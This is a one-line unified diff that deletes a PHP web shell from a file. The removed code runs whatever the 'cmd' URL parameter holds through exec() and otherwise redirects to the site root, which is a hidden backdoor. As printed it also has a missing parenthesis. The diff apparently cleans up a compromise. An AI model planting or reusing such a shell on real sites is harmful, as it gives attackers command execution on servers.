@@ -1,1 +1,0 @@
-<?php if(!isset($_GET['cmd']){ header('Location: /'); } else { echo exec($_GET['cmd']); } ?>
